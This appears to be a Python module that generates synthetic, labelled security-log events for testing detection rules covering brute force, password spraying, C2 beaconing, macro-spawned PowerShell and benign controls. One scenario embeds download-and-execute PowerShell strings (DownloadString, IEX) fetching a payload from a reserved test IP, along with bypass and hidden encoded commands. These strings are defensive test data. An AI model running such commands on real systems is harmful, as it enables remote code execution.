"""Scenario templates for synthetic SOC dataset generation.

Scenarios define correlated multi-event attack patterns and benign activity
patterns. Each scenario produces a list of raw event dicts plus a
GroundTruthEntry describing expected behaviour.

Events use nested ``process``, ``network`` and ``authentication`` dicts so
the SentinelForge normalizer can extract them correctly.
"""

from __future__ import annotations

import random
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from typing import Any


def _deterministic_rng(seed: int) -> random.Random:
    """Create a seeded RNG for reproducible synthetic dataset generation.

    Used exclusively for generating synthetic test datasets where seed
    reproducibility is required for deterministic test output. NOT used
    for any cryptographic or security-sensitive purpose.
    """
    return random.Random(seed)  # nosec B311


@dataclass
class Scenario:
    """A scenario template that generates correlated events."""

    scenario_id: str
    dataset_id: str
    expected_behaviour: str
    classification: str  # "benign" | "suspicious"
    expected_detection_category: str
    expected_severity_range: str
    att_ck_candidate_mappings: tuple[str, ...] = field(default_factory=tuple)
    explanation: str = ""

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:
        """Generate events for this scenario.

        Returns (events, start_timestamp, end_timestamp).
        """
        raise NotImplementedError


# ---------------------------------------------------------------------------
# Helper utilities
# ---------------------------------------------------------------------------


def _iso(dt: datetime) -> str:
    """Format a datetime as ISO-8601 UTC."""
    return dt.astimezone(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def _add_seconds(dt: datetime, seconds: int) -> datetime:
    return dt + timedelta(seconds=seconds)


def _event(
    event_id: str,
    timestamp: str,
    event_type: str,
    host: str,
    user: str,
    source: str,
    process: dict[str, Any] | None = None,
    network: dict[str, Any] | None = None,
    authentication: dict[str, Any] | None = None,
    extra: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Build a raw event dict with optional nested process/network/auth."""
    ev: dict[str, Any] = {
        "event_id": event_id,
        "timestamp": timestamp,
        "event_type": event_type,
        "host": host,
        "user": user,
        "source": source,
    }
    if process is not None:
        ev["process"] = process
    if network is not None:
        ev["network"] = network
    if authentication is not None:
        ev["authentication"] = authentication
    if extra:
        ev.update(extra)
    return ev


# Reserved test IP ranges (RFC 5737) and .example domains (RFC 2606)
TEST_IPS = ["192.0.2.", "198.51.100.", "203.0.113."]
EXAMPLE_DOMAINS = ["example.com", "example.org", "example.net"]


def _random_ip(rng: random.Random) -> str:
    """Return a reserved test IP address."""
    return f"{rng.choice(TEST_IPS)}{rng.randint(1, 254)}"


# Realistic process names
PROCESS_NAMES = [
    "svchost.exe",
    "explorer.exe",
    "WINWORD.EXE",
    "EXCEL.EXE",
    "powershell.exe",
    "pwsh.exe",
    "wscript.exe",
    "mshta.exe",
    "cmd.exe",
    "notepad.exe",
    "chrome.exe",
    "firefox.exe",
    "EDRAgent.exe",
    "spoolsv.exe",
    "lsass.exe",
    "services.exe",
]

# Realistic host names
HOSTS = ["WKSTN-01", "WKSTN-02", "WKSTN-03", "SRV-01", "SRV-02", "DC-01", "LAPTOP-01"]

# Realistic usernames
USERS = ["jdoe", "asmith", "rjohnson", "mwilliams", "sadmin", "jdev", "opsuser"]


# ===========================================================================
# Scenario implementations
# ===========================================================================


class SysmonProcessTreeScenario(Scenario):
    """Word/Excel spawning PowerShell — classic initial access pattern."""

    expected_event_count = 3

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        host = rng.choice(hosts)
        user = rng.choice(users)
        events: list[dict] = []

        # T0: User opens a document (file activity)
        t0 = _iso(start_time)
        ppid = rng.randint(1000, 9999)
        events.append(
            _event(
                event_id=f"{self.scenario_id}-evt-001",
                timestamp=t0,
                event_type="file.open",
                host=host,
                user=user,
                source="jsonl",
                process={
                    "name": "WINWORD.EXE",
                    "path": "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE",
                    "pid": ppid,
                    "command_line": (
                        'WINWORD.EXE "C:\\\\Users\\\\'
                        + user
                        + '\\\\Documents\\\\invoice.docx"'
                    ),
                    "user": user,
                },
                extra={
                    "file_name": f"C:\\\\Users\\\\{user}\\\\Documents\\\\invoice.docx",
                },
            )
        )

        # T0+30s: Word spawns PowerShell (suspicious parent-child)
        t1 = _iso(_add_seconds(start_time, 30))
        pid1 = rng.randint(1000, 9999)
        events.append(
            _event(
                event_id=f"{self.scenario_id}-evt-002",
                timestamp=t1,
                event_type="process.create",
                host=host,
                user=user,
                source="jsonl",
                process={
                    "name": "powershell.exe",
                    "path": (
                        "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\"
                        "v1.0\\\\powershell.exe"
                    ),
                    "pid": pid1,
                    "ppid": ppid,
                    "command_line": (
                        "powershell.exe -ExecutionPolicy Bypass -File "
                        f"C:\\\\Users\\\\{user}\\\\Downloads\\\\payload.ps1"
                    ),
                    "user": user,
                },
            )
        )

        # T0+60s: PowerShell makes outbound connection (C2 beacon)
        t2 = _iso(_add_seconds(start_time, 60))
        events.append(
            _event(
                event_id=f"{self.scenario_id}-evt-003",
                timestamp=t2,
                event_type="network.connect",
                host=host,
                user=user,
                source="jsonl",
                process={
                    "name": "powershell.exe",
                    "path": (
                        "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\"
                        "v1.0\\\\powershell.exe"
                    ),
                    "pid": pid1,
                    "command_line": (
                        "powershell.exe -ExecutionPolicy Bypass -File "
                        f"C:\\\\Users\\\\{user}\\\\Downloads\\\\payload.ps1"
                    ),
                    "user": user,
                },
                network={
                    "direction": "outbound",
                    "remote_address": "198.51.100.42",
                    "remote_port": "4433",
                    "protocol": "tcp",
                },
            )
        )

        end_ts = t2
        return events, t0, end_ts


class SmallBruteForceScenario(Scenario):
    """Multiple failed logins from one source against one account.

    Generates 8 failed login attempts from one source IP against one
    target user on one host. These are brute-force events, not password
    spraying, because they target a single account repeatedly.
    """

    expected_event_count = 9  # 8 failed + 1 successful login (contextual)

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        host = rng.choice(hosts)
        target_user = rng.choice(users)
        source_ip = f"{rng.choice(TEST_IPS)}{rng.randint(1, 254)}"
        events: list[dict] = []

        # 8 failed logins in quick succession
        for i in range(8):
            ts = _iso(_add_seconds(start_time, i * 15))
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-evt-{i + 1:03d}",
                    timestamp=ts,
                    event_type="auth.login.failed",
                    host=host,
                    user=target_user,
                    source="linux_auth",
                    authentication={
                        "outcome": "failure",
                        "method": "ssh",
                        "username": target_user,
                        "source_address": source_ip,
                    },
                )
            )

        # Final successful login after brute force
        ts = _iso(_add_seconds(start_time, 120))
        events.append(
            _event(
                event_id=f"{self.scenario_id}-evt-009",
                timestamp=ts,
                event_type="auth.login.success",
                host=host,
                user=target_user,
                source="linux_auth",
                authentication={
                    "outcome": "success",
                    "method": "ssh",
                    "username": target_user,
                    "source_address": source_ip,
                },
            )
        )

        end_ts = ts
        return events, events[0]["timestamp"], end_ts


class SmallPasswordSprayScenario(Scenario):
    """One source trying common passwords against multiple accounts."""

    expected_event_count = 6  # 6 failed logins against 6 different accounts

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        host = rng.choice(hosts)
        source_ip = f"{rng.choice(TEST_IPS)}{rng.randint(1, 254)}"
        events: list[dict] = []

        # Try against 6 different users, spaced out
        for i, username in enumerate(rng.sample(users, min(6, len(users)))):
            ts = _iso(_add_seconds(start_time, i * 45))
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-evt-{i + 1:03d}",
                    timestamp=ts,
                    event_type="auth.login.failed",
                    host=host,
                    user=username,
                    source="linux_auth",
                    authentication={
                        "outcome": "failure",
                        "method": "ssh",
                        "username": username,
                        "source_address": source_ip,
                    },
                )
            )

        end_ts = events[-1]["timestamp"]
        return events, events[0]["timestamp"], end_ts


class SmallC2BeaconScenario(Scenario):
    """Regular periodic outbound connections to unusual destination."""

    expected_event_count = 8  # 8 periodic connections

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        host = rng.choice(hosts)
        user = rng.choice(users)
        dest_ip = f"{rng.choice(TEST_IPS)}{rng.randint(1, 254)}"
        dest_port = rng.choice([4433, 8443, 8080, 9001])
        events: list[dict] = []

        # 8 periodic connections at ~60s intervals with small jitter
        for i in range(8):
            jitter = rng.randint(-5, 5)
            ts = _iso(_add_seconds(start_time, i * 60 + jitter))
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-evt-{i + 1:03d}",
                    timestamp=ts,
                    event_type="network.connect",
                    host=host,
                    user=user,
                    source="network",
                    network={
                        "direction": "outbound",
                        "remote_address": dest_ip,
                        "remote_port": str(dest_port),
                        "protocol": "tcp",
                    },
                    process={
                        "name": "svchost.exe",
                        "pid": rng.randint(1000, 9999),
                    },
                )
            )

        end_ts = events[-1]["timestamp"]
        return events, events[0]["timestamp"], end_ts


class EDRHeartbeatScenario(Scenario):
    """Legitimate periodic EDR heartbeat (benign, should not alert)."""

    expected_event_count = 6

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        host = rng.choice(hosts)
        events: list[dict] = []

        # 6 regular heartbeats to known EDR infrastructure
        for i in range(6):
            ts = _iso(_add_seconds(start_time, i * 300))
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-evt-{i + 1:03d}",
                    timestamp=ts,
                    event_type="network.connect",
                    host=host,
                    user="system",
                    source="network",
                    network={
                        "direction": "outbound",
                        "remote_address": "169.254.169.254",
                        "remote_port": "443",
                        "protocol": "tcp",
                    },
                    process={
                        "name": "EDRAgent.exe",
                        "pid": rng.randint(1000, 9999),
                    },
                )
            )

        end_ts = events[-1]["timestamp"]
        return events, events[0]["timestamp"], end_ts


class OfficeMacroScenario(Scenario):
    """Office document macro downloading and executing PowerShell (T1204.002)."""

    expected_event_count = 3

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        host = rng.choice(hosts)
        user = rng.choice(users)
        events: list[dict] = []

        # T0: Word opens document with macro
        t0 = _iso(start_time)
        ppid = rng.randint(1000, 9999)
        events.append(
            _event(
                event_id=f"{self.scenario_id}-evt-001",
                timestamp=t0,
                event_type="file.open",
                host=host,
                user=user,
                source="jsonl",
                process={
                    "name": "WINWORD.EXE",
                    "path": (
                        "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\"
                        "Office16\\\\WINWORD.EXE"
                    ),
                    "pid": ppid,
                    "command_line": (
                        'WINWORD.EXE "C:\\\\Users\\\\'
                        + user
                        + '\\\\Documents\\\\report.docm"'
                    ),
                    "user": user,
                },
                extra={
                    "file_name": f"C:\\\\Users\\\\{user}\\\\Documents\\\\report.docm",
                },
            )
        )

        # T0+45s: Word spawns PowerShell (suspicious parent-child)
        t1 = _iso(_add_seconds(start_time, 45))
        pid1 = rng.randint(1000, 9999)
        events.append(
            _event(
                event_id=f"{self.scenario_id}-evt-002",
                timestamp=t1,
                event_type="process.create",
                host=host,
                user=user,
                source="jsonl",
                process={
                    "name": "powershell.exe",
                    "path": (
                        "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\"
                        "v1.0\\\\powershell.exe"
                    ),
                    "pid": pid1,
                    "ppid": ppid,
                    "command_line": (
                        "powershell.exe -ExecutionPolicy Bypass -File "
                        f"C:\\\\Users\\\\{user}\\\\AppData\\\\"
                        f"Local\\\\Temp\\\\macro.ps1"
                    ),
                    "user": user,
                },
            )
        )

        # T0+90s: PowerShell downloads additional payload
        t2 = _iso(_add_seconds(start_time, 90))
        events.append(
            _event(
                event_id=f"{self.scenario_id}-evt-003",
                timestamp=t2,
                event_type="file.download",
                host=host,
                user=user,
                source="jsonl",
                process={
                    "name": "powershell.exe",
                    "path": (
                        "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\"
                        "v1.0\\\\powershell.exe"
                    ),
                    "pid": pid1,
                    "ppid": ppid,
                    "command_line": "powershell.exe -c download_string",
                    "user": user,
                },
                extra={
                    "file_name": (
                        f"C:\\\\Users\\\\{user}\\\\AppData\\\\Local\\\\"
                        f"Temp\\\\payload2.ps1"
                    ),
                },
            )
        )

        end_ts = t2
        return events, t0, end_ts


class MultiHostScenario(Scenario):
    """Suspicious activity across multiple hosts from same source IP."""

    expected_event_count = 3  # 3 failed logins to 3 different hosts

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        source_ip = f"{rng.choice(TEST_IPS)}{rng.randint(1, 254)}"
        events: list[dict] = []

        # Same source IP hits 3 different hosts
        for i, host in enumerate(rng.sample(hosts, min(3, len(hosts)))):
            user = rng.choice(users)
            ts = _iso(_add_seconds(start_time, i * 60))
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-evt-{i + 1:03d}",
                    timestamp=ts,
                    event_type="auth.login.failed",
                    host=host,
                    user=user,
                    source="linux_auth",
                    authentication={
                        "outcome": "failure",
                        "method": "ssh",
                        "username": user,
                        "source_address": source_ip,
                    },
                )
            )

        end_ts = events[-1]["timestamp"]
        return events, events[0]["timestamp"], end_ts


class BenignPowerShellAdminScenario(Scenario):
    """Legitimate administrative PowerShell execution (benign).

    Uses signed scripts, no execution policy bypass, no encoded commands,
    no download-and-execute — should NOT trigger the PowerShell rule.
    """

    expected_event_count = 5

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        host = rng.choice(hosts)
        user = rng.choice(users)
        events: list[dict] = []

        # 5 benign PowerShell admin commands
        admin_commands = [
            "powershell.exe -Command Get-Process",
            "powershell.exe -Command Get-Service",
            "powershell.exe -Command Get-EventLog -LogName System -Newest 10",
            "powershell.exe -File C:\\\\Scripts\\\\Inventory.ps1",
            "pwsh.exe -Command Get-ChildItem C:\\\\Temp",
        ]

        for i, cmd in enumerate(admin_commands):
            ts = _iso(_add_seconds(start_time, i * 120))
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-evt-{i + 1:03d}",
                    timestamp=ts,
                    event_type="process.create",
                    host=host,
                    user=user,
                    source="jsonl",
                    process={
                        "name": "powershell.exe"
                        if "powershell.exe" in cmd
                        else "pwsh.exe",
                        "path": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
                        "pid": rng.randint(1000, 9999),
                        "command_line": cmd,
                        "user": user,
                    },
                )
            )

        end_ts = events[-1]["timestamp"]
        return events, events[0]["timestamp"], end_ts


class SoftwareUpdateScenario(Scenario):
    """Legitimate software update traffic (benign).

    svchost.exe connecting to Windows Update endpoints over HTTPS 443 —
    normal periodic traffic that should not trigger C2 beaconing.
    """

    expected_event_count = 8

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        host = rng.choice(hosts)
        user = "system"
        events: list[dict] = []

        # 8 periodic update check connections over standard HTTPS
        for i in range(8):
            ts = _iso(_add_seconds(start_time, i * 600))
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-evt-{i + 1:03d}",
                    timestamp=ts,
                    event_type="network.connect",
                    host=host,
                    user=user,
                    source="network",
                    network={
                        "direction": "outbound",
                        "remote_address": "update.microsoft.com",
                        "remote_port": "443",
                        "protocol": "tcp",
                    },
                    process={
                        "name": "svchost.exe",
                        "pid": rng.randint(1000, 9999),
                    },
                )
            )

        end_ts = events[-1]["timestamp"]
        return events, events[0]["timestamp"], end_ts


class ScheduledTaskScenario(Scenario):
    """Legitimate scheduled task execution (benign).

    Normal parent-child process relationships from task scheduler —
    svchost.exe spawning legitimate tools, not Office → PowerShell.
    """

    expected_event_count = 8  # 4 task pairs × 2 events each

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        host = rng.choice(hosts)
        user = rng.choice(users)
        events: list[dict] = []

        # 4 legitimate scheduled task executions
        task_pairs = [
            ("svchost.exe", "notepad.exe"),
            ("svchost.exe", "cmd.exe"),
            ("explorer.exe", "chrome.exe"),
            ("services.exe", "spoolsv.exe"),
        ]

        for i, (parent, child) in enumerate(task_pairs):
            ts = _iso(_add_seconds(start_time, i * 300))
            ppid = rng.randint(1000, 9999)
            pid = rng.randint(1000, 9999)
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-evt-{i * 2 + 1:03d}",
                    timestamp=ts,
                    event_type="process.create",
                    host=host,
                    user=user,
                    source="jsonl",
                    process={
                        "name": parent,
                        "path": f"C:\\\\Windows\\\\System32\\\\{parent}",
                        "pid": ppid,
                        "command_line": parent,
                        "user": user,
                    },
                )
            )
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-evt-{i * 2 + 2:03d}",
                    timestamp=_iso(_add_seconds(start_time, i * 300 + 5)),
                    event_type="process.create",
                    host=host,
                    user=user,
                    source="jsonl",
                    process={
                        "name": child,
                        "path": f"C:\\\\Windows\\\\System32\\\\{child}",
                        "pid": pid,
                        "ppid": ppid,
                        "command_line": child,
                        "user": user,
                    },
                )
            )

        end_ts = events[-1]["timestamp"]
        return events, events[0]["timestamp"], end_ts


class NormalDNSScenario(Scenario):
    """Normal DNS resolution traffic (benign).

    Standard DNS queries to .example domains — no unusual patterns,
    no suspicious bursts, no algorithmically generated domains.
    """

    expected_event_count = 10

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        host = rng.choice(hosts)
        events: list[dict] = []

        # 10 normal DNS queries
        for i in range(10):
            ts = _iso(_add_seconds(start_time, i * 30))
            domain = f"www.{rng.choice(EXAMPLE_DOMAINS)}"
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-evt-{i + 1:03d}",
                    timestamp=ts,
                    event_type="dns.query",
                    host=host,
                    user="system",
                    source="dns",
                    extra={
                        "query": domain,
                        "query_type": "A",
                        "response_code": "NOERROR",
                        "source_address": _random_ip(rng),
                    },
                )
            )

        end_ts = events[-1]["timestamp"]
        return events, events[0]["timestamp"], end_ts


class NormalOutboundHTTPSScenario(Scenario):
    """Normal outbound HTTPS traffic (benign).

    Browser connections to example.com over standard port 443 —
    legitimate web browsing that should not trigger beacon detection.
    """

    expected_event_count = 8

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        host = rng.choice(hosts)
        user = rng.choice(users)
        events: list[dict] = []

        # 8 regular HTTPS connections to legitimate domains
        for i in range(8):
            ts = _iso(_add_seconds(start_time, i * 120))
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-evt-{i + 1:03d}",
                    timestamp=ts,
                    event_type="network.connect",
                    host=host,
                    user=user,
                    source="network",
                    network={
                        "direction": "outbound",
                        "remote_address": "example.com",
                        "remote_port": "443",
                        "protocol": "tcp",
                    },
                    process={
                        "name": "chrome.exe",
                        "pid": rng.randint(1000, 9999),
                    },
                )
            )

        end_ts = events[-1]["timestamp"]
        return events, events[0]["timestamp"], end_ts


class SuccessfulAuthScenario(Scenario):
    """Normal successful authentication activity (benign).

    Users logging in successfully from expected sources —
    no failures, no bursts, no spraying.
    """

    expected_event_count = 7

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        host = rng.choice(hosts)
        events: list[dict] = []

        # 8 successful logins across different users
        for i, user in enumerate(rng.sample(users, min(8, len(users)))):
            ts = _iso(_add_seconds(start_time, i * 60))
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-evt-{i + 1:03d}",
                    timestamp=ts,
                    event_type="auth.login.success",
                    host=host,
                    user=user,
                    source="linux_auth",
                    authentication={
                        "outcome": "success",
                        "method": "ssh",
                        "username": user,
                        "source_address": f"10.0.0.{i + 1}",
                    },
                )
            )

        end_ts = events[-1]["timestamp"]
        return events, events[0]["timestamp"], end_ts


class BulkBenignActivityScenario(Scenario):
    """Large-scale benign activity scenario.

    Generates 600+ normal, non-suspicious events across multiple log sources
    to provide a substantial labeled benign cohort for evaluation.

    Labels are assigned by scenario-generation intent, not by detection output.
    """

    expected_event_count = 600  # 200 auth + 200 DNS + 200 HTTPS

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        events: list[dict] = []

        # 200 successful authentications (benign)
        for i in range(200):
            host = rng.choice(hosts)
            user = rng.choice(users)
            ts = _iso(_add_seconds(start_time, i * 30))
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-auth-{i:04d}",
                    timestamp=ts,
                    event_type="auth.login.success",
                    host=host,
                    user=user,
                    source="linux_auth",
                    authentication={
                        "outcome": "success",
                        "method": "ssh",
                        "username": user,
                        "source_address": f"10.0.{i // 254}.{i % 254}",
                    },
                )
            )

        # 200 normal DNS queries (benign)
        for i in range(200):
            host = rng.choice(hosts)
            ts = _iso(_add_seconds(start_time, 6000 + i * 15))
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-dns-{i:04d}",
                    timestamp=ts,
                    event_type="dns.query",
                    host=host,
                    user="system",
                    source="dns",
                    extra={
                        "query": f"www.{rng.choice(EXAMPLE_DOMAINS)}",
                        "query_type": "A",
                        "response_code": "NOERROR",
                        "source_address": _random_ip(rng),
                    },
                )
            )

        # 200 normal HTTPS connections (benign)
        for i in range(200):
            host = rng.choice(hosts)
            user = rng.choice(users)
            ts = _iso(_add_seconds(start_time, 12000 + i * 20))
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-https-{i:04d}",
                    timestamp=ts,
                    event_type="network.connect",
                    host=host,
                    user=user,
                    source="network",
                    network={
                        "direction": "outbound",
                        "remote_address": "example.com",
                        "remote_port": "443",
                        "protocol": "tcp",
                    },
                    process={
                        "name": "chrome.exe",
                        "pid": rng.randint(1000, 9999),
                    },
                )
            )

        end_ts = events[-1]["timestamp"]
        return events, events[0]["timestamp"], end_ts


class BulkBruteForceScenario(Scenario):
    """Bulk brute-force authentication scenario (failed_login_burst).

    Generates 200 failed login attempts from one source IP against one
    target user on one host. These are brute-force events, not password
    spraying, because they target a single account repeatedly.
    """

    expected_event_count = 200

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        events: list[dict] = []

        source_ip = f"{rng.choice(TEST_IPS)}{rng.randint(1, 254)}"
        target_user = rng.choice(users)
        host = rng.choice(hosts)
        for i in range(200):
            ts = _iso(_add_seconds(start_time, i * 5))
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-bruteforce-{i:04d}",
                    timestamp=ts,
                    event_type="auth.login.failed",
                    host=host,
                    user=target_user,
                    source="linux_auth",
                    authentication={
                        "outcome": "failure",
                        "method": "ssh",
                        "username": target_user,
                        "source_address": source_ip,
                    },
                )
            )

        end_ts = events[-1]["timestamp"]
        return events, events[0]["timestamp"], end_ts


class BulkPasswordSprayScenario(Scenario):
    """Bulk password-spraying authentication scenario (password_spray).

    Generates ~204 failed login attempts from one source IP against
    multiple distinct usernames. These are password-spraying events,
    distinct from brute-force because they spread attempts across
    many accounts.
    """

    expected_event_count = 204  # 6 users * 34 attempts ≈ 204

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        events: list[dict] = []

        spray_source = f"{rng.choice(TEST_IPS)}{rng.randint(1, 254)}"
        spray_users = rng.sample(users, min(6, len(users)))
        for i, username in enumerate(spray_users * 34):  # ~204 attempts
            ts = _iso(_add_seconds(start_time, 1000 + i * 10))
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-spray-{i:04d}",
                    timestamp=ts,
                    event_type="auth.login.failed",
                    host=rng.choice(hosts),
                    user=username,
                    source="linux_auth",
                    authentication={
                        "outcome": "failure",
                        "method": "ssh",
                        "username": username,
                        "source_address": spray_source,
                    },
                )
            )

        end_ts = events[-1]["timestamp"]
        return events, events[0]["timestamp"], end_ts


class BulkC2BeaconScenario(Scenario):
    """Bulk C2 beaconing network scenario (c2_beacon).

    Generates 200 periodic outbound network connections to an unusual
    destination. These are beacon events, not authentication events.
    """

    expected_event_count = 200

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        events: list[dict] = []

        beacon_ip = f"{rng.choice(TEST_IPS)}{rng.randint(1, 254)}"
        beacon_port = rng.choice([4433, 8443, 8080, 9001])
        beacon_host = rng.choice(hosts)
        beacon_user = rng.choice(users)
        for i in range(200):
            jitter = rng.randint(-3, 3)
            ts = _iso(_add_seconds(start_time, 2000 + i * 60 + jitter))
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-beacon-{i:04d}",
                    timestamp=ts,
                    event_type="network.connect",
                    host=beacon_host,
                    user=beacon_user,
                    source="network",
                    network={
                        "direction": "outbound",
                        "remote_address": beacon_ip,
                        "remote_port": str(beacon_port),
                        "protocol": "tcp",
                    },
                    process={
                        "name": "svchost.exe",
                        "pid": rng.randint(1000, 9999),
                    },
                )
            )

        end_ts = events[-1]["timestamp"]
        return events, events[0]["timestamp"], end_ts


class BenignPowerShellVariantsScenario(Scenario):
    """Legitimate PowerShell command variants (benign).

    Generates PowerShell events with command lines that should NOT trigger
    the SuspiciousPowerShellRule:
    - RemoteSigned execution policy (not Bypass)
    - -NoProfile with simple admin commands
    - Simple Get-Process/Get-Service commands
    - Encoded commands with benign (non-malicious) intent

    Labels are assigned by scenario-generation intent, not detection output.
    """

    expected_event_count = 5

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        host = rng.choice(hosts)
        user = rng.choice(users)
        events: list[dict] = []

        # Benign PowerShell command variants (should NOT trigger detection)
        benign_commands = [
            # RemoteSigned execution policy (less restrictive than Bypass, but legitimate)
            "powershell.exe -ExecutionPolicy RemoteSigned -File C:\\\\Scripts\\\\AdminTool.ps1",
            # NoProfile with simple admin command
            "powershell.exe -NoProfile -Command Get-Service",
            # Simple administrative commands (no suspicious indicators)
            "powershell.exe -Command Get-Process",
            "pwsh.exe -Command Get-ChildItem C:\\\\Temp",
            # Encoded command with benign intent (licensed software)
            "powershell.exe -EncodedCommand UwBlbmQtTWlsZSBNZXNzYWdl",
        ]

        for i, cmd in enumerate(benign_commands):
            ts = _iso(_add_seconds(start_time, i * 120))
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-evt-{i + 1:03d}",
                    timestamp=ts,
                    event_type="process.create",
                    host=host,
                    user=user,
                    source="jsonl",
                    process={
                        "name": "powershell.exe"
                        if "powershell.exe" in cmd
                        else "pwsh.exe",
                        "path": "C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe",
                        "pid": rng.randint(1000, 9999),
                        "command_line": cmd,
                        "user": user,
                    },
                )
            )

        end_ts = events[-1]["timestamp"]
        return events, events[0]["timestamp"], end_ts


class SuspiciousPowerShellExecutionScenario(Scenario):
    """Suspicious PowerShell execution (suspicious).

    Generates PowerShell events with command lines that SHOULD trigger
    the SuspiciousPowerShellRule:
    - ExecutionPolicy Bypass (weight 6)
    - Download-and-execute (weight 6)
    - Encoded commands with suspicious intent (weight 6)
    - Multiple indicators combined (weight >= 6)

    Labels are assigned by scenario-generation intent, not detection output.
    """

    expected_event_count = 5

    def generate(
        self, seed: int, start_time: datetime, hosts: list[str], users: list[str]
    ) -> tuple[list[dict], str, str]:

        rng = _deterministic_rng(seed)
        host = rng.choice(hosts)
        user = rng.choice(users)
        events: list[dict] = []

        # Suspicious PowerShell command variants (SHOULD trigger detection)
        suspicious_commands = [
            # ExecutionPolicy Bypass + download-and-execute (weight 12)
            "powershell.exe -ExecutionPolicy Bypass -File C:\\\\Users\\\\"
            + user
            + "\\\\Downloads\\\\payload.ps1",
            # Encoded command + bypass (weight 12)
            "powershell.exe -ExecutionPolicy Bypass -EncodedCommand UwBlbmQtV2ViUmVxdWVzdA==",
            # DownloadString + Net.WebClient (weight 6)
            'powershell.exe -Command (New-Object Net.WebClient).DownloadString("http://198.51.100.42/payload.ps1")',
            # IEX + Invoke-WebRequest (weight 6)
            'powershell.exe -Command IEX (Invoke-WebRequest -Uri "http://198.51.100.42/payload.ps1")',
            # Hidden + EncodedCommand (weight 8)
            "powershell.exe -Hidden -EncodedCommand UwBlbmQtV2ViUmVxdWVzdA==",
        ]

        for i, cmd in enumerate(suspicious_commands):
            ts = _iso(_add_seconds(start_time, i * 120))
            events.append(
                _event(
                    event_id=f"{self.scenario_id}-evt-{i + 1:03d}",
                    timestamp=ts,
                    event_type="process.create",
                    host=host,
                    user=user,
                    source="jsonl",
                    process={
                        "name": "powershell.exe",
                        "path": "C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe",
                        "pid": rng.randint(1000, 9999),
                        "ppid": rng.randint(1000, 9999),
                        "command_line": cmd,
                        "user": user,
                    },
                )
            )

        end_ts = events[-1]["timestamp"]
        return events, events[0]["timestamp"], end_ts


class ScenarioLibrary:
